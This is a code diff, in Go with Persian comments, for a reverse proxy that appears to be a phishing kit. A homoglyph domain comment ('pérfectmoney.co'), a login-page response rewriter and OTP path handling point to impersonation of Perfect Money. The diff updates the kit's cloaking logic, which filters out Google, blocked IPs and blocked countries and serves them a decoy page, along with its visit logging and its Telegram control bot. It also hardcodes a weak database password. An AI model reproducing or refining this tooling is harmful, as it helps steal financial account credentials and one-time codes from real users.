@@ -88,10 +88,14 @@ func savePathInDatabase(path string) error {
 	_, err := db.Exec(`
 		INSERT INTO allowed_paths (path, is_active) 
 		VALUES ($1, TRUE) 
-		ON CONFLICT (path) DO NOTHING
+		ON CONFLICT (path) 
+		DO UPDATE 
+		SET is_active = TRUE 
+		WHERE allowed_paths.is_active = FALSE
 	`, path)
 	return err
 }
+
 func cacheContent(path string, contentType string, data []byte) {
 	content := CachedContent{
 		ContentType: contentType,
@@ -358,6 +362,9 @@ type CaptchaResponse struct {
 }
 
 func getCaptchaResponse() (CaptchaResponse, error) {
+	// دایرکتوری که فایل‌های captcha در آن قرار دارند
+	captchaDir := "/root/cgi_per/"
+
 	all := []struct {
 		Code string
 		File string
@@ -378,11 +385,16 @@ func getCaptchaResponse() (CaptchaResponse, error) {
 	rand.Seed(time.Now().UnixNano())
 	randomItem := all[rand.Intn(len(all))]
 
-	imageData, err := ioutil.ReadFile(randomItem.File)
+	// مسیر کامل فایل تصویر را ایجاد کنید
+	filePath := captchaDir + randomItem.File
+
+	// فایل تصویر را بخوانید
+	imageData, err := ioutil.ReadFile(filePath)
 	if err != nil {
 		return CaptchaResponse{}, fmt.Errorf("failed to read image file: %v", err)
 	}
 
+	// تصویر را به base64 تبدیل کنید
 	base64Image := base64.StdEncoding.EncodeToString(imageData)
 	response := CaptchaResponse{
 		Text:  randomItem.Code,
@@ -391,6 +403,7 @@ func getCaptchaResponse() (CaptchaResponse, error) {
 
 	return response, nil
 }
+
 func modifyResponse_login_html(userIP string) func(*http.Response) error {
 	return func(res *http.Response) error {
 
@@ -553,10 +566,10 @@ func handleRequestAndRedirect(res http.ResponseWriter, req *http.Request) {
 	// بررسی سیستم‌عامل
 	if runtime.GOOS == "windows" {
 		// مسیر دایرکتوری برای ویندوز
-		filePath = filepath.Join("E:", "cgi_perfect", "style", "index", "index2.html")
+		filePath = filepath.Join("E:", "cgi_perfect", "style", "index2.html")
 	} else {
 		// مسیر دایرکتوری برای لینوکس
-		filePath = filepath.Join("/root", "cgi_per", "style", "index", "index2.html")
+		filePath = filepath.Join("/root", "cgi_per", "style", "index2.html")
 	}
 	domain := req.Host
 	Domain = "http://" + domain
@@ -585,12 +598,16 @@ func handleRequestAndRedirect(res http.ResponseWriter, req *http.Request) {
 		log.Printf("Error checking google: %v", err)
 		file, err := os.ReadFile(filePath)
 		if err != nil {
-
 			http.Error(res, "Unable to load page", http.StatusInternalServerError)
-			return
+			return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
 		}
+
+		// اگر خطا نبود، ادامه می‌دهیم
 		res.Header().Set("Content-Type", "text/html")
-		res.Write(file)
+		_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
+		if err != nil {
+			log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
+		}
 
 	}
 	if allowed {
@@ -599,34 +616,46 @@ func handleRequestAndRedirect(res http.ResponseWriter, req *http.Request) {
 			log.Printf("Error checking path: %v", err)
 			file, err := os.ReadFile(filePath)
 			if err != nil {
-
 				http.Error(res, "Unable to load page", http.StatusInternalServerError)
-				return
+				return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
 			}
+
+			// اگر خطا نبود، ادامه می‌دهیم
 			res.Header().Set("Content-Type", "text/html")
-			res.Write(file)
+			_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
+			if err != nil {
+				log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
+			}
 		}
 
 		if !allowedPath {
 			file, err := os.ReadFile(filePath)
 			if err != nil {
-
 				http.Error(res, "Unable to load page", http.StatusInternalServerError)
-				return
+				return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
 			}
+
+			// اگر خطا نبود، ادامه می‌دهیم
 			res.Header().Set("Content-Type", "text/html")
-			res.Write(file)
+			_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
+			if err != nil {
+				log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
+			}
 		}
 		if err != nil {
 			log.Printf("Error checking IP: %v", err)
 			file, err := os.ReadFile(filePath)
 			if err != nil {
-
 				http.Error(res, "Unable to load page", http.StatusInternalServerError)
-				return
+				return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
 			}
+
+			// اگر خطا نبود، ادامه می‌دهیم
 			res.Header().Set("Content-Type", "text/html")
-			res.Write(file)
+			_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
+			if err != nil {
+				log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
+			}
 		}
 
 		ipBlocked, err := isIPBlocked(db, ip)
@@ -634,12 +663,16 @@ func handleRequestAndRedirect(res http.ResponseWriter, req *http.Request) {
 			log.Printf("Error checking if IP is blocked: %v", err)
 			file, err := os.ReadFile(filePath)
 			if err != nil {
-
 				http.Error(res, "Unable to load page", http.StatusInternalServerError)
-				return
+				return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
 			}
+
+			// اگر خطا نبود، ادامه می‌دهیم
 			res.Header().Set("Content-Type", "text/html")
-			res.Write(file)
+			_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
+			if err != nil {
+				log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
+			}
 		}
 
 		countryBlocked := isCountryBlocked(country)
@@ -647,23 +680,31 @@ func handleRequestAndRedirect(res http.ResponseWriter, req *http.Request) {
 			log.Printf("Error checking if country is blocked: %v", err)
 			file, err := os.ReadFile(filePath)
 			if err != nil {
-
 				http.Error(res, "Unable to load page", http.StatusInternalServerError)
-				return
+				return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
 			}
+
+			// اگر خطا نبود، ادامه می‌دهیم
 			res.Header().Set("Content-Type", "text/html")
-			res.Write(file)
+			_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
+			if err != nil {
+				log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
+			}
 		}
 
 		if ipBlocked || countryBlocked {
 			file, err := os.ReadFile(filePath)
 			if err != nil {
-
 				http.Error(res, "Unable to load page", http.StatusInternalServerError)
-				return
+				return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
 			}
+
+			// اگر خطا نبود، ادامه می‌دهیم
 			res.Header().Set("Content-Type", "text/html")
-			res.Write(file)
+			_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
+			if err != nil {
+				log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
+			}
 		}
 
 		// درج لاگ بازدید در دیتابیس
@@ -671,12 +712,16 @@ func handleRequestAndRedirect(res http.ResponseWriter, req *http.Request) {
 		if err != nil {
 			file, err := os.ReadFile(filePath)
 			if err != nil {
-
 				http.Error(res, "Unable to load page", http.StatusInternalServerError)
-				return
+				return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
 			}
+
+			// اگر خطا نبود، ادامه می‌دهیم
 			res.Header().Set("Content-Type", "text/html")
-			res.Write(file)
+			_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
+			if err != nil {
+				log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
+			}
 		}
 
 		// افزایش تعداد درخواست‌ها برای این IP
@@ -687,12 +732,16 @@ func handleRequestAndRedirect(res http.ResponseWriter, req *http.Request) {
 			blockIP(ip)
 			file, err := os.ReadFile(filePath)
 			if err != nil {
-
 				http.Error(res, "Unable to load page", http.StatusInternalServerError)
-				return
+				return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
 			}
+
+			// اگر خطا نبود، ادامه می‌دهیم
 			res.Header().Set("Content-Type", "text/html")
-			res.Write(file)
+			_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
+			if err != nil {
+				log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
+			}
 		}
 
 		if match, _ := regexp.MatchString("/otp.asp$", req.URL.Path); match {
@@ -907,12 +956,16 @@ func handleRequestAndRedirect(res http.ResponseWriter, req *http.Request) {
 	} else {
 		file, err := os.ReadFile(filePath)
 		if err != nil {
-
 			http.Error(res, "Unable to load page", http.StatusInternalServerError)
-			return
+			return // بلافاصله بازگشت می‌کنیم تا ادامه کد اجرا نشود
 		}
+
+		// اگر خطا نبود، ادامه می‌دهیم
 		res.Header().Set("Content-Type", "text/html")
-		res.Write(file)
+		_, err = res.Write(file) // res.Write بعد از تنظیم هدرها
+		if err != nil {
+			log.Println("Error writing response:", err) // لاگ کردن خطا در صورت بروز
+		}
 	}
 }
 
@@ -1057,8 +1110,15 @@ func insertVisitLog(ip, path, domain, referer, platform string, timestamp time.T
 	_, err := db.Exec(`
 		INSERT INTO visit_logs (ip, path, domain, timestamp, country, referer, platform, request_count) 
 		VALUES ($1, $2, $3, $4, $5, $6, $7, 0) 
-		ON CONFLICT (ip) DO UPDATE SET request_count = visit_logs.request_count + 1`,
-		ip, path, domain, timestamp, country, referer, platform)
+		ON CONFLICT (ip) DO UPDATE 
+		SET request_count = visit_logs.request_count + 1, 
+		    path = EXCLUDED.path,
+		    domain = EXCLUDED.domain,
+		    timestamp = EXCLUDED.timestamp,
+		    country = EXCLUDED.country,
+		    referer = EXCLUDED.referer,
+		    platform = EXCLUDED.platform
+	`, ip, path, domain, timestamp, country, referer, platform)
 	return err
 }
 
@@ -1256,6 +1316,26 @@ func createTables(db *sql.DB) error {
                                path TEXT NOT NULL,
                                is_active BOOLEAN DEFAULT TRUE
       );`,
+		`DO $$
+      BEGIN
+    IF NOT EXISTS (
+        SELECT 1
+        FROM pg_constraint
+        WHERE conname = 'unique_ip'
+    ) THEN
+        ALTER TABLE visit_logs ADD CONSTRAINT unique_ip UNIQUE (ip);
+    END IF;
+     END $$;`,
+		`DO $$
+BEGIN
+    IF NOT EXISTS (
+        SELECT 1
+        FROM pg_constraint
+        WHERE conname = 'unique_path'
+    ) THEN
+        ALTER TABLE allowed_paths ADD CONSTRAINT unique_path UNIQUE (path);
+    END IF;
+END $$;`,
 	}
 
 	for _, query := range queries {
@@ -1347,7 +1427,7 @@ func startTelegramBot() {
 		if update.Message == nil {
 			continue
 		}
-		if len(update.Message.Text) > 9 && update.Message.Text[:9] == "block ip " {
+		if len(update.Message.Text) > 10 && update.Message.Text[:10] == "block ip " {
 			ip := update.Message.Text[9:] // Extract the IP address from the message
 
 			// Block the IP address
@@ -1364,8 +1444,8 @@ func startTelegramBot() {
 		}
 
 		// Command for unblocking an IP
-		if len(update.Message.Text) > 11 && update.Message.Text[:11] == "unblock ip " {
-			ip := update.Message.Text[11:] // Extract the IP address from the message
+		if len(update.Message.Text) > 12 && update.Message.Text[:12] == "unblock ip " {
+			ip := update.Message.Text[12:] // Extract the IP address from the message
 
 			// Unblock the IP address
 			err := unblockIP(ip)
@@ -1381,8 +1461,8 @@ func startTelegramBot() {
 		}
 
 		// Command for blocking a country
-		if len(update.Message.Text) > 13 && update.Message.Text[:13] == "block country " {
-			countryCode := update.Message.Text[13:] // Extract the country code from the message
+		if len(update.Message.Text) > 14 && update.Message.Text[:14] == "block country " {
+			countryCode := update.Message.Text[14:] // Extract the country code from the message
 
 			// Block the country
 			err := blockCountry(countryCode)
@@ -1398,8 +1478,8 @@ func startTelegramBot() {
 		}
 
 		// Command for unblocking a country
-		if len(update.Message.Text) > 15 && update.Message.Text[:15] == "unblock country " {
-			countryCode := update.Message.Text[15:] // Extract the country code from the message
+		if len(update.Message.Text) > 16 && update.Message.Text[:16] == "unblock country " {
+			countryCode := update.Message.Text[16:] // Extract the country code from the message
 
 			// Unblock the country
 			err := unblockCountry(countryCode)
@@ -1480,7 +1560,7 @@ func startTelegramBot() {
 
 // pérfectmoney.co
 func main() {
-	connStr := "user=postgres password=12345678 dbname=proxy_logs sslmode=disable"
+	connStr := "user=postgres password=123456 dbname=proxy_logs sslmode=disable"
 	var err error
 	db, err = sql.Open("postgres", connStr)
 	if err != nil {
@@ -1499,8 +1579,8 @@ func main() {
 	}()
 	go startTelegramBot()
 
-	cssHandler := http.FileServer(http.Dir("E:\\cgi_perfect\\style"))
-	//cssHandler := http.FileServer(http.Dir("/root/cgi_perfect/style"))
+	//cssHandler := http.FileServer(http.Dir("E:\\cgi_perfect\\style"))
+	cssHandler := http.FileServer(http.Dir("/root/cgi_per/style"))
 	// تعریف یک هندلر برای روت که درخواست‌ها را به دایرکتوری CSS ریدایرکت می‌کند
 	http.HandleFunc("/index/", func(w http.ResponseWriter, r *http.Request) {
 		r.URL.Path = strings.TrimPrefix(r.URL.Path, "/index")
